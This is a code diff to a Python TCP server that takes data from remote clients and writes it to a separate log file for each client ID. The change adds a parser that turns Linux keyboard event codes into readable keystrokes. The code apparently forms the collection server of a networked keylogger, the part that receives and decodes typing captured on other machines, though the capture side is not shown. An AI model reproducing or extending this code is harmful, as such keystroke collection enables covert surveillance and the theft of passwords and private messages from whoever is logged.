@@ -7,6 +7,7 @@ import configparser
 import threading
 
 import protocol
+import keyboard
 
 
 class UnknownMessageType(Exception):
@@ -49,9 +50,8 @@ class TCPHandler(socketserver.BaseRequestHandler):
                     self.server.logger.info('End connection with ' + self._client_address_str())
                     return
                 else:
-                    self.server.logger.warning(
-                        'Received ' + msg_type.name + ' while expecting ' + protocol.ClientMsgTypes.HELLO.name + ' or ' +
-                        protocol.ClientMsgTypes.BYE.name + ' from ' + self._client_address_str())
+                    self.server.logger.warning('Received ' + msg_type.name + ' while expecting ' + protocol.ClientMsgTypes.HELLO.name + ' or ' +
+                                               protocol.ClientMsgTypes.BYE.name + ' from ' + self._client_address_str())
                     self.request.sendall(struct.pack('>B', protocol.Error.ILLEGAL_MSG_TYPE))
                     self.server.logger.warning('Connection with ' + self._client_address_str() + ' terminated')
                     return
@@ -73,10 +73,12 @@ class TCPHandler(socketserver.BaseRequestHandler):
                     length = struct.unpack('>I ', data)[0]
                     data = self._recv_all(length)
                     with open(str(self.client_id) + '.log', 'a+') as client_log_file:
-                        # TODO parse data to readable format
-                        # TODO optionally add data encryption/decryption
-                        client_log_file.write(str(data))
-                    self.request.sendall(struct.pack('>B', protocol.ServerMsgTypes.OK))
+                        try:
+                            client_log_file.write(parse(data))
+                            self.request.sendall(struct.pack('>B', protocol.ServerMsgTypes.OK))
+                        except KeyError:
+                            self.server.logger.warning('Cannot parse data  from ' + self._client_address_str())
+                            self.request.sendall(struct.pack('>B', protocol.Error.PARSE_ERROR))
                 else:
                     self.server.logger.warning(
                         'Received ' + msg_type.name + ' while expecting ' + protocol.ClientMsgTypes.SEND.name + ' or ' +
@@ -155,9 +157,9 @@ class Server(socketserver.TCPServer):
         self.mutex = threading.Lock()
         self.connected_clients_id = []
 
-    def serve_forever(self):
+    def serve_forever(self, poll_interval=0.5):
         self.logger.info('Starting server...')
-        super().serve_forever()
+        super().serve_forever(poll_interval)
 
     def get_new_id(self):
         with self.mutex:
@@ -191,6 +193,18 @@ class Server(socketserver.TCPServer):
         console_handler.setFormatter(formatter)
         self.logger.addHandler(file_handler)
         self.logger.addHandler(console_handler)
+
+
+def parse(data):
+    result = ''
+    for i in range(0, len(data), 2):
+        if int(data[i]) == keyboard.LinuxKeyboardAction.DOWN or int(data[i]) == keyboard.LinuxKeyboardAction.HOLD:
+            result += keyboard.LinuxKeycodeMapper[data[i+1]]
+        elif int(data[i]) == keyboard.LinuxKeyboardAction.OMIT:
+            result += ' OMITTED: ' + str(data[i+1]) + ' '
+        elif int(data[i]) != keyboard.LinuxKeyboardAction.UP:
+            raise KeyError
+    return result
 
 
 def parse_arguments():
